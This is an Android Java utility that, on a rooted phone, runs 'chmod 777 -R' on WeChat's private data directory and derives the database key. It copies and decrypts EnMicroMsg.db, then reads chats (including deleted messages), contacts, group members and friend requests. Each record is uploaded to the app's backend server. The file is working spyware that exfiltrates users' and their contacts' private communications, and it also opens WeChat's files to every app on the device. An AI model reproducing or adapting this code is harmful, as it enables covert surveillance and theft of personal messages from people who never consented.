package com.heyi.testing.utils.wxmsgroot;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Environment;
import android.util.Log;
import com.threekilogram.objectbus.bus.ObjectBus;
import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;
import org.dom4j.CDATA;
import org.dom4j.Document;
import org.dom4j.Element;
import org.dom4j.dom.DOMCDATA;
import org.dom4j.io.SAXReader;

import com.heyi.testing.app.AppLication;
import com.heyi.testing.app.AppLication;
import com.heyi.testing.config.BaseApiConfig;
import com.heyi.testing.greendao.UserDao;
import com.heyi.testing.greendao.UserDaoDao;
import com.heyi.testing.utils.OkhtttpUtils;
import com.heyi.testing.utils.SpUtil;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * FileUtiles class
 *
 * @author auser
 * @date 10/28/2019
 */
public class WeChatEnDbUtils {
    private static final ObjectBus task = ObjectBus.create();
    /**
     * 微信本机数据缓存根路径
     */
    @SuppressLint("SdCardPath")
    private static final String WX_ROOT_PATH = "/data/data/com.tencent.mm/";
    /**
     * 微信消息存储路径，在根路径下
     */
    private static final String WX_DB_DIR_PATH = WX_ROOT_PATH + "MicroMsg";
    /**
     * 聊天数据库文件名
     */
    private static final String WX_DB_FILE_NAME = "EnMicroMsg.db";
    /**
     * 拷贝的聊天数据库文件名
     */
    private static final String COPY_WX_MSG_DATA_DB = "wx_msg_data.db";
    /**
     * SD卡根路径
     */
    private static final String SDCARD_PATH = Environment.getExternalStorageDirectory().getPath() + "/";
    /**
     * 拷贝的数据库路径
     */
    private static final String copyFilePath = SDCARD_PATH + COPY_WX_MSG_DATA_DB;
    private static WeChatEnDbUtils instance;
    public boolean isDebug = false;
    private String UID;
    private String UDID;
    private String PHONE_WXID;

    /**
     * 私有化构造函数
     */
    private WeChatEnDbUtils() {
        this.UID = SpUtil.get("id", "");
        this.UDID = SpUtil.get("SerialNumber", "");
        this.PHONE_WXID = SpUtil.get("wx_name", "");
    }

    /**
     * 单例模式
     *
     * @return 当前类实例
     */
    public static WeChatEnDbUtils getInstance() {
        if (instance == null) {
            instance = new WeChatEnDbUtils();
        }
        return instance;
    }
    // endregion

//    /**
//     * 递归查询微信本地数据库文件
//     *
//     * @param file     目录
//     * @param fileName 需要查找的文件名称
//     */
//    public static void searchFile(File file, String fileName) {
//        if (file.isDirectory()) {
//            File[] files = file.listFiles();
//            if (files != null) {
//                for (File childFile : files) {
//                    searchFile(childFile, fileName);
//                }
//            }
//        } else {
//            if (fileName.equals(file.getName())) {
//                mWxDbPathList.add(file);
//            }
//        }
//    }

    /**
     * 获取群聊成员列表
     */
    private void getChatRoomData(SQLiteDatabase db, String taskId) {
        Cursor c1 = null;
        String chatRoomId = SpUtil.get("qunId", "");
        String WxQunId = SpUtil.get("WxQunId", "");
        if (isDebug) {
            chatRoomId = "2522046147@chatroom";
        }
        if (chatRoomId == null || chatRoomId.trim().isEmpty()) return;
        try {
            c1 = db.rawQuery("select * from chatroom where chatroomname = '" + chatRoomId + "'", null);
            Log.e("openWxDb", "群组信息记录分割线=====================================================================================");
            while (c1.moveToNext()) {
                String roomowner = c1.getString(c1.getColumnIndex("roomowner"));
                String chatroomname = c1.getString(c1.getColumnIndex("chatroomname"));
                String memberlist = c1.getString(c1.getColumnIndex("displayname"));
                Log.e("openWxDb", "群主====" + roomowner + "    群组成员id=====" + memberlist + "    群id=====" + chatroomname);
                Map<String, String> params = new HashMap<>();
                params.put("uid", UID);
                params.put("udid", UDID);
                params.put("qunId", WxQunId);
                params.put("CyName", memberlist);
                params.put("sffriend", "0");
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.ROOT_WX_GROUP_MEMBER_LIST, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("获取群信息消息", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.i("获取群信息消息", json);
                    }
                });
                Thread.sleep(200);
                if (isDebug) {
                    break;
                }
            }
            c1.close();
            db.close();
        } catch (Exception e) {
            if (c1 != null) {
                c1.close();
            }
            if (db != null) {
                db.close();
            }
            Log.e("openWxDb", "读取数据库信息失败" + e.toString());
        } finally {
            if (taskId != null && !taskId.trim().isEmpty()) {

                Map<String, String> params = new HashMap<>();
                params.put("TaskId", taskId);
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.TASK_RECEIPT, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("获取群信息消息回执", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.i("获取群信息消息回执", json);
                    }
                });
            }
            UserDaoDao userDaoDao = AppLication.getInstance().getDaoSession().getUserDaoDao();
            List<UserDao> userDaos = userDaoDao.queryBuilder().orderAsc(UserDaoDao.Properties.Timestamp).limit(1).list();
            if (userDaos.size() > 0) {
                Log.e("aaa", "删除了" + userDaos.get(0).getMessage());
                userDaoDao.delete(userDaos.get(0));
            }
        }
    }

    /**
     * 查询聊天信息
     * 这里查出的聊天信息包含用户主动删除的信息
     * 无心的聊天信息删除不是物理删除，所哟只要不卸载仍然可以查到聊天记录
     */
    private void getMessageData(SQLiteDatabase db, String taskId) {
        Cursor c1 = null;
        try {
            String currentMsgId= SpUtil.get("lastMsgId","");
            String sql="select * from message where (type = 1 or type = 37 or type = 42 or type=436207665 or type=49) and msgId not in (select msgId from message where talker like '%chatroom')";
            if (currentMsgId!=null && !"".equals(currentMsgId)){
                sql="select * from message where (type = 1 or type = 37 or type = 42 or type=436207665 or type=49) and msgId > "+currentMsgId+" and msgId not in (select msgId from message where talker like '%chatroom')";
            }
            //这里只查询文本消息，type=1  图片消息是47，具体信息可以自己测试  http://emoji.qpic.cn/wx_emoji/gV159fHh6rYfCMejCAU1wIoP6eywxFMYjaJiaBzPbSjoc6XlTLoMyKQEh4nswfrX5/ （发送表情连接可以拼接的）
            c1 = db.rawQuery(
                    sql,
//                    "select * from message where type = 1 ",
                    null);
            Log.e("openWxDb", "聊天记录分割线=====================================================================================");
            while (c1.moveToNext()) {
                String msgId = c1.getString(c1.getColumnIndex("msgId"));
                String type = c1.getString(c1.getColumnIndex("type"));
                String talker = c1.getString(c1.getColumnIndex("talker"));
                String content = c1.getString(c1.getColumnIndex("content"));
                String createTime = c1.getString(c1.getColumnIndex("createTime"));
                Log.e("openWxDb", "聊天对象微信号====" + talker + "    内容=====" + content + "    时间=====" + createTime);
                Map<String, String> params = new HashMap<>();
                params.put("uid", UID);
                params.put("udid", UDID);
                params.put("benjiWxHao", PHONE_WXID);
                params.put("haoyouWxHao", talker);
                Log.e("openWxDb", "登录uid====" + UID + ",udid=====" + UDID + " 本机微信号=====" + PHONE_WXID);
                switch (type) {
                    case "1":
                        // 文本
                        params.put("type", "1");
                        params.put("content", content);
                        break;
                    case "436207665":
                        // 红包
                        params.put("type", "2");
                        params.put("content", talker + "给你发了红包");
                        break;
                    case "42":
                        SAXReader saxReader = new SAXReader();
                        Document document = saxReader.read(new ByteArrayInputStream(content.getBytes(StandardCharsets.UTF_8)));
                        Element root = document.getRootElement();
                        String nickname = root.attributeValue("nickname");
                        // 名片
                        params.put("type", "6");
                        params.put("content", talker + "给你分享了名片'" + nickname + "'");
                        break;
                    case "49":
                        SAXReader saxReader1 = new SAXReader();
                        Document document1 = saxReader1.read(new ByteArrayInputStream(content.getBytes(StandardCharsets.UTF_8)));
                        Element root1 = document1.getRootElement();
                        //Element des = root1.element("des");

//                        String msg = new DOMCDATA(des.getText()).getData();
//                        String[] msgArr = msg.split("\"");
                        // 名片
                        params.put("type", "4");
                        params.put("content", talker +"给你分享了群聊名片");
//                        params.put("content", talker + msgArr[1]+"给你分享了群聊名片");
                        break;
                    default:
                        params.put("type", "0");
                        params.put("content", content);
                        break;
                }
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.ROOT_INSERT_FRIEND_MESSAGE, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("添加微信好友聊天消息", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.i("添加微信好友聊天消息", json);
                    }
                });
                SpUtil.put("lastMsgId",msgId);
                Thread.sleep(200);
                if (isDebug) {
                    break;
                }
            }
            c1.close();
        } catch (Exception e) {
            if (c1 != null) {
                c1.close();
            }
            if (db != null) {
                db.close();
            }
            Log.e("openWxDb", "读取数据库信息失败" + e.toString());
        } finally {
            if (taskId != null && !taskId.trim().isEmpty()) {

                Map<String, String> params = new HashMap<>();
                params.put("TaskId", taskId);
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.TASK_RECEIPT, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("添加微信好友聊天消息回执", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.i("添加微信好友聊天消息回执", "成功:" + json);
                    }
                });
            }
            UserDaoDao userDaoDao = AppLication.getInstance().getDaoSession().getUserDaoDao();
            List<UserDao> userDaos = userDaoDao.queryBuilder().orderAsc(UserDaoDao.Properties.Timestamp).limit(1).list();
            if (userDaos.size() > 0) {
                Log.e("aaa", "删除了" + userDaos.get(0).getMessage());
                userDaoDao.delete(userDaos.get(0));
            }
        }
    }

    /**
     * 获取好友添加信息
     */
    private void getNewFriendData(SQLiteDatabase db, String taskId) {
        Cursor c1 = null;
        try {
            //这里只查询文本消息，type=1  图片消息是47，具体信息可以自己测试  http://emoji.qpic.cn/wx_emoji/gV159fHh6rYfCMejCAU1wIoP6eywxFMYjaJiaBzPbSjoc6XlTLoMyKQEh4nswfrX5/ （发送表情连接可以拼接的）
            c1 = db.rawQuery(
                    "select fmsgContent from fmessage_conversation",
//                    "select * from message where type = 1 ",
                    null);
            Log.e("openWxDb", "好友添加记录分割线=====================================================================================");
            while (c1.moveToNext()) {
                String fmsgContent = c1.getString(c1.getColumnIndex("fmsgContent"));
                SAXReader saxReader = new SAXReader();
                Document document = saxReader.read(new ByteArrayInputStream(fmsgContent.getBytes(StandardCharsets.UTF_8)));
                Element root = document.getRootElement();
                String talker = root.attributeValue("fromusername");
                String nickname = root.attributeValue("fromnickname");
                String content = root.attributeValue("content");
                String sourcenickname = root.attributeValue("sourcenickname");
                // 采集微信好友接口地址
                //YM/Self/insertFriend?wxName=&wxHao=&uid=&udid=
                Map<String, String> params = new HashMap<>();
                params.put("uid", UID);
                params.put("udid", UDID);
                params.put("benjiWxHao", PHONE_WXID);
                params.put("haoyouWxHao", talker);
                params.put("wxNiCheng", nickname);
                params.put("content", nickname + ":请求加你为好友明对你说:" + content);
                params.put("type", "5");
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.ROOT_INSERT_FRIEND_MESSAGE, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("添加微信好友添加消息", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.i("添加微信好友添加消息", "请求成功");
                    }
                });
                if (sourcenickname != null && !"".equals(sourcenickname)) {
                    Map<String, String> params2 = new HashMap<>();
                    params.put("uid", UID);
                    params.put("udid", UDID);
                    params.put("friendName", nickname);
                    params.put("recommenderName", sourcenickname);
                    OkhtttpUtils.getInstance().doPost(BaseApiConfig.ROOT_NEW_FRIEND_RECOMMENDER, params, new OkhtttpUtils.OkCallback() {
                        @Override
                        public void onFailure(Exception e) {
                            Log.w("添加微信好友推荐消息", "请求失败" + e.getLocalizedMessage());
                        }

                        @Override
                        public void onResponse(String json) {
                            Log.i("添加微信好友推荐消息", "请求成功");
                        }
                    });
                }
                Thread.sleep(200);
                if (isDebug) {
                    break;
                }
            }
            c1.close();
        } catch (Exception e) {
            if (c1 != null) {
                c1.close();
            }
            if (db != null) {
                db.close();
            }
            Log.e("openWxDb", "读取数据库信息失败" + e.toString());
        } finally {
            if (taskId != null && !taskId.trim().isEmpty()) {

                Map<String, String> params = new HashMap<>();
                params.put("TaskId", taskId);
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.TASK_RECEIPT, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("添加微信好友添加消息回执", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.i("添加微信好友添加消息回执", "请求成功");
                    }
                });
            }
            Log.e("aaa", "添加微信好友添加消息-删除数据");
            UserDaoDao userDaoDao = AppLication.getInstance().getDaoSession().getUserDaoDao();
            List<UserDao> userDaos = userDaoDao.queryBuilder().orderAsc(UserDaoDao.Properties.Timestamp).limit(1).list();
            if (userDaos.size() > 0) {
                Log.e("aaa", "删除了" + userDaos.get(0).getMessage());
                userDaoDao.delete(userDaos.get(0));
            }
        }
    }

    /**
     * 获取数据库连接对象
     */
    private SQLiteDatabase openWxDb(File dbFile, final Context mContext, String mDbPassword) {

        SQLiteDatabase.loadLibs(mContext);
        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
            @Override
            public void preKey(SQLiteDatabase database) {
            }

            @Override
            public void postKey(SQLiteDatabase database) {
                database.rawExecSQL("PRAGMA cipher_migrate;");
            }
        };
        //打开数据库连接
        return SQLiteDatabase.openOrCreateDatabase(dbFile, mDbPassword, null, hook);
    }

    /**
     * 复制单个文件
     *
     * @param oldPath String 原文件路径 如：c:/fqf.txt
     * @param newPath String 复制后路径 如：f:/fqf.txt
     * @return boolean
     */
    private boolean copyFile(String oldPath, String newPath) {
        try {
            int byteRead;
            File oldFile = new File(oldPath);
            if (oldFile.exists()) { //文件存在时
                InputStream inStream = new FileInputStream(oldPath); //读入原文件
                FileOutputStream fs = new FileOutputStream(newPath);
                byte[] buffer = new byte[1444];
                while ((byteRead = inStream.read(buffer)) != -1) {
                    fs.write(buffer, 0, byteRead);
                }
                inStream.close();
            }
            return true;
        } catch (Exception e) {
            Log.e("copyFile", "复制单个文件操作出错");
            e.printStackTrace();
            return false;
        }
    }

    /**
     * 查询所有聊天信息
     */
    private void runMessage(final Context mContext, final SQLiteDatabase db, final String taskId) {
        task.toPool(() -> getMessageData(db, taskId)).toMain(() -> Log.d("WeChatEnDbUtils", "聊天信息查询完毕")).run();
    }

    /**
     * 获取群聊成员列表
     */
    private void runChatRoom(final Context mContext, final SQLiteDatabase db, final String taskId) {
        task.toPool(() -> getChatRoomData(db, taskId)).toMain(() -> Log.d("WeChatEnDbUtils", "查询群聊成员列表完毕")).run();
    }

    /**
     * 获取群聊列表
     */
    private void runChatRoomList(final Context mContext, final SQLiteDatabase db, final String taskId) {
        task.toPool(() -> getChatRoomListData(db, taskId)).toMain(() -> Log.d("WeChatEnDbUtils", "查询群聊列表完毕")).run();
    }

    /**
     * 微信好友
     */
    private void runRecontact(final Context mContext, final SQLiteDatabase db, final String taskId) {
        task.toPool(() -> getRecontactData(db, taskId)).toMain(() -> Log.d("WeChatEnDbUtils", "查询通讯录完毕")).run();
    }

    /**
     * 查询所有好友添加信息
     */
    private void runNewFriend(final Context mContext, final SQLiteDatabase db, final String taskId) {
        task.toPool(() -> getNewFriendData(db, taskId)).toMain(() -> Log.d("WeChatEnDbUtils", "好友添加信息查询完毕")).run();
    }

    /**
     * 获取群列表
     *
     * @param db
     */
    private void getChatRoomListData(SQLiteDatabase db, String taskId) {
        Cursor c1 = null;
        try {
            //查询所有联系人（verifyFlag!=0:公众号等类型，群里面非好友的类型为4，未知类型2）
            c1 = db.rawQuery(
                    "select * from rcontact where username like '%chatroom'",
//                    "select * from rcontact where verifyFlag = 0 and type != 4 and type != 2 and nickname != ''",
                    null);
            while (c1.moveToNext()) {
                String userName = c1.getString(c1.getColumnIndex("username"));
                String nickName = c1.getString(c1.getColumnIndex("nickname"));
                Log.e("openWxDb", "userName====" + userName + "    nickName=====" + nickName);
                Map<String, String> params = new HashMap<>();
                params.put("WxQunName", nickName);
                params.put("WxQunId", userName);
                params.put("uid", UID);
                params.put("udid", UDID);
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.ROOT_WX_GROUP_LIST, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("添加微信群记录", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.w("添加微信群记录", "请求成功" + json);
                    }
                });
                Thread.sleep(200);
                if (isDebug) {
                    break;
                }
            }
            c1.close();
        } catch (Exception e) {
            if (c1 != null) {
                c1.close();
            }
            if (db != null) {
                db.close();
            }
            Log.e("openWxDb", "读取数据库信息失败" + e.toString());
        } finally {
            if (taskId != null && !taskId.trim().isEmpty()) {
                Map<String, String> params = new HashMap<>();
                params.put("TaskId", taskId);
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.TASK_RECEIPT, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("添加微信群记录回执", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.w("添加微信群记录回执", "请求成功" + json);
                    }
                });
            }
            Log.e("aaa", "添加微信群记录-删除数据");
            UserDaoDao userDaoDao = AppLication.getInstance().getDaoSession().getUserDaoDao();
            List<UserDao> userDaos = userDaoDao.queryBuilder().orderAsc(UserDaoDao.Properties.Timestamp).limit(1).list();
            if (userDaos.size() > 0) {
                Log.e("aaa", "删除了" + userDaos.get(0).getMessage());
                userDaoDao.delete(userDaos.get(0));
            }
        }
    }

    /**
     * 获取当前用户的微信所有联系人
     */
    private void getRecontactData(SQLiteDatabase db, String taskId) {
        Cursor c1 = null;
        try {
            //查询所有联系人（verifyFlag!=0:公众号等类型，群里面非好友的类型为4，未知类型2）
            c1 = db.rawQuery(
                    "select * from rcontact where verifyFlag = 0 and type ==3 ",
//                    "select * from rcontact where verifyFlag = 0 and type != 4 and type != 2 and nickname != ''",
                    null);
            while (c1.moveToNext()) {
                String userName = c1.getString(c1.getColumnIndex("username"));
                String nickName = c1.getString(c1.getColumnIndex("nickname"));
                Log.e("openWxDb", "userName====" + userName + "    nickName=====" + nickName);
                // 采集微信好友接口地址
                //YM/Self/insertFriend?wxName=&wxHao=&uid=&udid=
                Map<String, String> params = new HashMap<>();
                params.put("wxName", nickName);
                params.put("wxHao", userName);
                params.put("uid", UID);
                params.put("udid", UDID);
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.ROOT_INSERT_FRIEND, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("添加微信通讯录记录", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.w("添加微信通讯录记录", "请求成功");
                    }
                });
                Thread.sleep(200);
                if (isDebug) {
                    break;
                }
            }
            c1.close();
        } catch (Exception e) {
            if (c1 != null) {
                c1.close();
            }
            if (db != null) {
                db.close();
            }
            Log.e("openWxDb", "读取数据库信息失败" + e.toString());
        } finally {
            if (taskId != null && !taskId.trim().isEmpty()) {

                Map<String, String> params = new HashMap<>();
                params.put("TaskId", taskId);
                OkhtttpUtils.getInstance().doPost(BaseApiConfig.TASK_RECEIPT, params, new OkhtttpUtils.OkCallback() {
                    @Override
                    public void onFailure(Exception e) {
                        Log.w("添加微信通讯录记录回执", "请求失败" + e.getLocalizedMessage());
                    }

                    @Override
                    public void onResponse(String json) {
                        Log.w("添加微信通讯录记录回执", "请求成功");
                    }
                });
            }

            UserDaoDao userDaoDao = AppLication.getInstance().getDaoSession().getUserDaoDao();
            List<UserDao> userDaos = userDaoDao.queryBuilder().orderAsc(UserDaoDao.Properties.Timestamp).limit(1).list();
            if (userDaos.size() > 0) {
                Log.e("aaa", "删除了" + userDaos.get(0).getMessage());
                userDaoDao.delete(userDaos.get(0));
            }
        }
    }

    /**
     * 获取微信消息
     *
     * @param context 上下文
     * @param type    类别 1 获取好友 2获取聊天消息 3 获取群成员列表 4 获取添加好友人的信息 5获取群列表
     */
    public void getWxMsg(Context context, int type, String taskId) {
        if (!DecryptUtils.isRootSystem()) {
            Log.e("aaa", "请先ROOT您的设备");
            return;
        }
        if (!isDebug) {
            if ("".equals(UID) || "".equals(UDID) || "".equals(PHONE_WXID)) {
                Log.e("params", "`UID`和`UDID`和`当前微信号` 不能为空");
                return;
                //throw new RuntimeException("`UID`和`UDID`和`当前微信号` 不能为空");
            }

        }
        ObjectBus.create().toPool(() -> {
            //获取root权限
            if (!DecryptUtils.execRootCmd("chmod 777 -R " + WX_ROOT_PATH)) return;
            //获取root权限
            DecryptUtils.execRootCmd("chmod 777 -R " + copyFilePath);
            String password = DecryptUtils.initDbPassword();
            String uid = DecryptUtils.initCurrWxUin();
            try {
                String path = WX_DB_DIR_PATH + "/" + Md5Utils.md5Encode("mm" + uid) + "/" + WX_DB_FILE_NAME;
                Log.e("path", copyFilePath);
                Log.e("path", path);
                Log.e("path", password);
                //微信原始数据库的地址
                File wxDataDir = new File(path);
                //将微信数据库拷贝出来，因为直接连接微信的db，会导致微信崩溃
                boolean isCopied = copyFile(wxDataDir.getAbsolutePath(), copyFilePath);
                if (!isCopied) return;
                //将微信数据库导出到sd卡操作sd卡上数据库
                SQLiteDatabase db = openWxDb(new File(copyFilePath), context, password);
                switch (type) {
                    case 1:
                        // 获取好友
                        runRecontact(context, db, taskId);
                        break;
                    case 2:
                        // 获取聊天信息
                        runMessage(context, db, taskId);
                        break;
                    case 3:
                        // 获取群聊成员列表
                        runChatRoom(context, db, taskId);
                        break;
                    case 4:
                        runNewFriend(context, db, taskId);
                        break;
                    case 5:
                        runChatRoomList(context, db, taskId);
                        break;
                    default:
                        break;
                }
            } catch (Exception e) {
                Log.e("path", e.getMessage());
                e.printStackTrace();
            }
        }).run();
    }
}
